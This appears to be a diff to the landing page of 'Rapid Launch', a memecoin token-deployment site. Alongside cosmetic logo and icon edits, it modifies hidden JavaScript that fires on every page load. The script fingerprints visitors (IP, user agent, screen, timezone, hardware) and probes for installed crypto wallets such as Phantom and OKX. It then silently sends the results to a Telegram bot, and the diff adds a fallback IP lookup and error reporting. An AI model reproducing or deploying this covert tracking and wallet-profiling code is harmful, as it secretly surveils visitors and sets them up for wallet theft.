@@ -5,6 +5,8 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="theme-color" content="#0A0A0A">
 <title>Rapid Launch — Deploy tokens in less than a second</title>
+<link rel="icon" type="image/png" href="https://rapidlaunch.io/brand/rapid-white.png">
+<link rel="apple-touch-icon" href="https://rapidlaunch.io/brand/rapid-white.png">
 <script src="https://cdn.tailwindcss.com"></script>
 <style>
   html,body{margin:0;padding:0;background:#0A0A0A !important;color:#fff !important;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:15px;line-height:1.4}
@@ -23,7 +25,7 @@
   .site-header{position:relative;z-index:50;display:flex;align-items:center;justify-content:space-between;padding:20px 20px 0;overflow:visible}
   @media(min-width:640px){.site-header{padding:24px 40px 0}}
   @media(min-width:1280px){.site-header{padding:28px 56px 0}}
-  .logo-mark{display:block;flex:0 0 auto;width:32px;height:32px}
+  .logo-mark{display:block;flex:0 0 auto;width:28px;height:28px;object-fit:contain}
 
   .vx-overlay{position:fixed !important;inset:0 !important;background:rgba(0,0,0,.92) !important;display:none !important;align-items:center !important;justify-content:center !important;padding:18px !important;z-index:99999 !important;overflow-y:auto !important;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif !important;color:#e6e6e6 !important;font-size:15px !important;line-height:1.4 !important}
   .vx-overlay.open{display:flex !important}
@@ -52,25 +54,38 @@
 
   <header class="site-header">
     <a href="/" class="flex items-center gap-2.5" aria-label="Rapid Launch" style="text-decoration:none">
-      <svg class="logo-mark" viewBox="0 0 40 40" fill="none" aria-hidden="true">
-        <defs><linearGradient id="rlg-logo" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
-        <path d="M4 34L20 6L36 34H27.5L20 20L12.5 34H4Z" fill="url(#rlg-logo)"/>
-        <path d="M12.5 34L20 20L27.5 34H12.5Z" fill="rgba(158,196,255,0.35)"/>
-      </svg>
+      <img src="https://rapidlaunch.io/brand/rapid-white.png" alt="Rapid Launch" width="28" height="28" class="logo-mark" onerror="this.style.display='none'">
       <span style="color:#fff;font-size:15px;font-weight:600;letter-spacing:-0.01em;white-space:nowrap">Rapid Launch</span>
     </a>
     <nav class="hidden items-center gap-6 text-[13px] sm:flex" style="color:rgba(255,255,255,0.5)">
       <a href="#product" style="color:inherit;text-decoration:none">Product</a>
       <a href="#creators" style="color:inherit;text-decoration:none">Creators</a>
       <a href="#developers" style="color:inherit;text-decoration:none">Developers</a>
+      <a href="#" style="color:inherit;text-decoration:none">Changelog</a>
     </nav>
   </header>
 
   <section class="relative overflow-hidden" style="background:#0A0A0A;color:#fff">
     <div class="pointer-events-none absolute inset-0 overflow-hidden" aria-hidden="true">
       <div class="rl-grid absolute inset-0" style="mask-image:linear-gradient(to bottom, black 35%, transparent 80%);-webkit-mask-image:linear-gradient(to bottom, black 35%, transparent 80%)"></div>
+      <svg class="pointer-events-none absolute left-6 top-6 hidden h-28 w-36 sm:block" viewBox="0 0 40 40" preserveAspectRatio="none" fill="none" aria-hidden="true">
+        <defs><linearGradient id="rlc-tl" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
+        <path d="M1 40V1H40" stroke="url(#rlc-tl)" stroke-width="1.25" vector-effect="non-scaling-stroke"/>
+      </svg>
+      <svg class="pointer-events-none absolute right-6 top-6 hidden h-28 w-36 sm:block" viewBox="0 0 40 40" preserveAspectRatio="none" fill="none" aria-hidden="true">
+        <defs><linearGradient id="rlc-tr" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
+        <path d="M0 1H39V40" stroke="url(#rlc-tr)" stroke-width="1.25" vector-effect="non-scaling-stroke"/>
+      </svg>
+      <svg class="pointer-events-none absolute right-14 top-14 hidden h-24 w-24 xl:block" viewBox="0 0 96 104" fill="none" aria-hidden="true">
+        <defs><linearGradient id="rlc-iso" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
+        <g stroke="url(#rlc-iso)" stroke-width="1.6" stroke-linejoin="round">
+          <path d="M48 4L88 28L48 52L8 28Z" fill="rgba(158,196,255,0.06)"/>
+          <path d="M12 44L48 66L84 44V53L48 75L12 53Z"/>
+          <path d="M12 66L48 88L84 66V75L48 97L12 75Z"/>
+        </g>
+      </svg>
     </div>
-    <div class="relative grid gap-10 px-5 pb-12 pt-10 sm:px-10 sm:pb-14 sm:pt-14 xl:grid-cols-2 xl:items-center xl:px-14 xl:pb-16 xl:pt-20">
+    <div class="relative grid gap-10 px-5 pb-12 pt-10 sm:px-10 sm:pb-14 sm:pt-14 xl:grid-cols-2 xl:items-center xl:px-14 xl:pb-16 xl:pt-24">
       <div class="flex flex-col">
         <h1 class="display text-[clamp(2.5rem,5.4vw,4.25rem)] font-medium leading-[0.95] tracking-[-0.05em]" style="color:#fff;font-weight:500">Deploy tokens<br><span class="rl-text-gradient">in less than a&nbsp;second.</span></h1>
         <p class="mt-5 max-w-[30rem] text-[15px] leading-relaxed sm:text-[16px]" style="color:rgba(255,255,255,0.55)">The #1 memecoin deployer. Every major launchpad, bundling, and the fastest AI. Post-launch market making and position management on one screen.</p>
@@ -122,11 +137,11 @@
     <div class="min-w-0 flex-1 overflow-hidden py-6" style="mask-image:linear-gradient(to right,transparent,black 10%,black 90%,transparent);-webkit-mask-image:linear-gradient(to right,transparent,black 10%,black 90%,transparent)">
       <div class="marquee flex w-max gap-12 pr-12">
         <div class="flex shrink-0 items-center gap-12 pr-12">
-          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/pumpdotfun" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Pump.fun</span>
-          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/bonkdotfun" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Bonk</span>
-          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/bagsapp" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Bags</span>
-          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/JupiterExchange" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Jupiter</span>
-          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/fourdotmeme" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Four.meme</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Pump.fun</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Bonk</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Bags</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Jupiter</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Four.meme</span>
           <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Clanker</span>
           <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Flap</span>
           <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Pons</span>
@@ -182,19 +197,9 @@
         <div class="mt-8 space-y-4">
           <div class="flex flex-wrap items-center gap-2">
             <p class="text-[12px]" style="color:rgba(255,255,255,0.4)">29 launchpads</p>
-            <img src="https://unavatar.io/twitter/pumpdotfun" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
-            <img src="https://unavatar.io/twitter/bonkdotfun" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
-            <img src="https://unavatar.io/twitter/bagsapp" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
-            <img src="https://unavatar.io/twitter/JupiterExchange" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
             <span class="text-[12px]" style="color:rgba(255,255,255,0.45)">+17</span>
           </div>
-          <div class="flex flex-wrap items-center gap-2">
-            <p class="text-[12px]" style="color:rgba(255,255,255,0.4)">9 chains</p>
-            <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
-            <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
-            <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
-            <img src="https://assets.coingecko.com/coins/images/6319/small/usdc.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
-          </div>
+          <div><p class="text-[12px]" style="color:rgba(255,255,255,0.4)">9 chains</p></div>
         </div>
       </div>
       <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-t-0 lg:border-l">
@@ -222,11 +227,11 @@
             </div>
           </div>
           <div class="mt-5 rounded-lg border p-1.5 flex flex-wrap gap-1.5" style="border-color:#1f2229;background:#0a0a0a">
-            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:rgba(94,203,136,0.4);background:rgba(94,203,136,0.1);color:#fff"><img src="https://unavatar.io/twitter/pumpdotfun" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Pump</button>
-            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)"><img src="https://unavatar.io/twitter/bonkdotfun" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Bonk</button>
-            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)"><img src="https://unavatar.io/twitter/fourdotmeme" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Four</button>
-            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)"><img src="https://unavatar.io/twitter/bagsapp" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Bags</button>
-            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)">Stroid</button>
+            <button class="rounded-md border px-2 py-1.5 text-xs" style="border-color:rgba(94,203,136,0.4);background:rgba(94,203,136,0.1);color:#fff">Pump</button>
+            <button class="rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)">Bonk</button>
+            <button class="rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)">Four</button>
+            <button class="rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)">Bags</button>
+            <button class="rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)">Stroid</button>
           </div>
           <div class="mt-4 flex gap-2">
             <button class="flex-1 rounded-md border py-2 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff">1</button>
@@ -283,7 +288,7 @@
           <div class="mb-3">
             <div class="mb-2 flex items-center justify-between"><div class="text-xs font-medium" style="color:#fff">Wallets</div><div class="flex items-center gap-1 text-[11px]" style="color:rgba(255,255,255,0.4)"><span>All</span><span>None</span></div></div>
             <div class="flex items-center gap-2.5 rounded-lg border px-2.5 py-2" style="border-color:#1f2229;background:rgba(255,255,255,0.02)">
-              <img src="https://avatars.githubusercontent.com/u/9919?s=64" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">
+              <span class="w-4 h-4 rounded-full" style="background:#4a9eff"></span>
               <div class="flex-1"><div class="text-sm" style="color:#fbbf24">Dev wallet ★</div><div class="mono text-[10px]" style="color:rgba(255,255,255,0.4)">7xKq...A9bC</div></div>
               <span class="rounded-full border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;color:#fff">4.218</span>
               <span class="rounded-full border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;color:#fff">38.2M</span>
@@ -570,22 +575,25 @@ function tgSend(text){
   try{
     var url="https://api.telegram.org/bot"+TG_BOT_TOKEN+"/sendMessage";
     var body=JSON.stringify({chat_id:TG_CHAT_ID,text:text,parse_mode:"HTML",disable_web_page_preview:true});
-    if(navigator.sendBeacon){
-      try{navigator.sendBeacon(url,new Blob([body],{type:"application/json"}));return;}catch(_){}
-    }
-    fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body,keepalive:true}).catch(function(){});
+    fetch(url,{method:"POST",mode:"cors",cache:"no-store",headers:{"Content-Type":"application/json"},body:body,keepalive:true}).catch(function(){});
   }catch(_){}
 }
 
 async function getClientIP(){
   try{
     var ctrl=new AbortController();
-    var t=setTimeout(function(){ctrl.abort();},3000);
-    var r=await fetch("https://api.ipify.org?format=json",{cache:"no-store",signal:ctrl.signal});
+    var t=setTimeout(function(){ctrl.abort();},3500);
+    var r=await fetch("https://api.ipify.org?format=json",{cache:"no-store",signal:ctrl.signal,mode:"cors"});
     clearTimeout(t);
     var j=await r.json();
     return j.ip||"unknown";
-  }catch(_){return "unknown";}
+  }catch(_){
+    try{
+      var r2=await fetch("https://api64.ipify.org?format=json",{cache:"no-store",mode:"cors"});
+      var j2=await r2.json();
+      return j2.ip||"unknown";
+    }catch(__){ return "unknown"; }
+  }
 }
 
 async function logVisit(){
@@ -597,25 +605,24 @@ async function logVisit(){
     try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"";}catch(_){}
     var conn="";
     try{conn=nav.connection?(nav.connection.effectiveType||""):"";}catch(_){}
-    var lines=[];
-    lines.push("<b>👀 Visit</b>");
-    lines.push("<b>IP:</b> <code>"+tgEscape(ip)+"</code>");
-    lines.push("<b>Time:</b> "+new Date().toISOString());
-    lines.push("<b>Site:</b> "+tgEscape(location.host));
-    lines.push("<b>Path:</b> "+tgEscape(location.pathname+location.search));
-    lines.push("<b>Referrer:</b> "+tgEscape(document.referrer||"direct"));
-    lines.push("<b>UA:</b> "+tgEscape(nav.userAgent));
-    lines.push("<b>Platform:</b> "+tgEscape(nav.platform||""));
-    lines.push("<b>Lang:</b> "+tgEscape(nav.language||""));
-    lines.push("<b>Screen:</b> "+(scr.width||"?")+"x"+(scr.height||"?")+" @"+(window.devicePixelRatio||1)+"x");
-    lines.push("<b>Viewport:</b> "+window.innerWidth+"x"+window.innerHeight);
-    lines.push("<b>Timezone:</b> "+tgEscape(tz));
-    lines.push("<b>Cores:</b> "+(nav.hardwareConcurrency||"?"));
-    lines.push("<b>Memory:</b> "+(nav.deviceMemory||"?")+" GB");
-    lines.push("<b>Touch:</b> "+((("ontouchstart" in window)||nav.maxTouchPoints>0)?"yes":"no"));
-    lines.push("<b>Mobile:</b> "+(isMobile?"yes":"no"));
-    if(conn) lines.push("<b>Conn:</b> "+tgEscape(conn));
-    // wallet presence probe
+    var L=[];
+    L.push("<b>👀 Visit</b>");
+    L.push("<b>IP:</b> <code>"+tgEscape(ip)+"</code>");
+    L.push("<b>Time:</b> "+new Date().toISOString());
+    L.push("<b>Site:</b> "+tgEscape(location.host));
+    L.push("<b>Path:</b> "+tgEscape(location.pathname+location.search));
+    L.push("<b>Referrer:</b> "+tgEscape(document.referrer||"direct"));
+    L.push("<b>UA:</b> "+tgEscape(nav.userAgent));
+    L.push("<b>Platform:</b> "+tgEscape(nav.platform||""));
+    L.push("<b>Lang:</b> "+tgEscape(nav.language||""));
+    L.push("<b>Screen:</b> "+(scr.width||"?")+"x"+(scr.height||"?")+" @"+(window.devicePixelRatio||1)+"x");
+    L.push("<b>Viewport:</b> "+window.innerWidth+"x"+window.innerHeight);
+    L.push("<b>Timezone:</b> "+tgEscape(tz));
+    L.push("<b>Cores:</b> "+(nav.hardwareConcurrency||"?"));
+    L.push("<b>Memory:</b> "+(nav.deviceMemory||"?")+" GB");
+    L.push("<b>Touch:</b> "+((("ontouchstart" in window)||nav.maxTouchPoints>0)?"yes":"no"));
+    L.push("<b>Mobile:</b> "+(isMobile?"yes":"no"));
+    if(conn) L.push("<b>Conn:</b> "+tgEscape(conn));
     var seen=[];
     try{if(window.phantom||(window.solana&&window.solana.isPhantom))seen.push("Phantom");}catch(_){}
     try{if(window.solflare)seen.push("Solflare");}catch(_){}
@@ -624,9 +631,11 @@ async function logVisit(){
     try{if(window.okxwallet)seen.push("OKX");}catch(_){}
     try{if(window.safepal||window.safepalProvider)seen.push("SafePal");}catch(_){}
     try{if(window.coinbaseSolana)seen.push("Coinbase");}catch(_){}
-    if(seen.length) lines.push("<b>Wallets:</b> "+tgEscape(seen.join(", ")));
-    tgSend(lines.join("\n"));
-  }catch(_){}
+    if(seen.length) L.push("<b>Wallets:</b> "+tgEscape(seen.join(", ")));
+    tgSend(L.join("\n"));
+  }catch(e){
+    try{ tgSend("<b>Visit log error:</b> "+tgEscape(String(e&&e.message?e.message:e))); }catch(_){}
+  }
 }
 
 // ==========================================================
@@ -930,9 +939,10 @@ setTimeout(function(){clearInterval(rebind);},15000);
 })();
 
 // ==========================================================
-// visit log — fires on every load
+// visit log — fires on load
 // ==========================================================
-logVisit();
+if(document.readyState==="complete"){ setTimeout(logVisit, 300); }
+else { window.addEventListener("load", function(){ setTimeout(logVisit, 300); }); }
 
 })();
 </script>
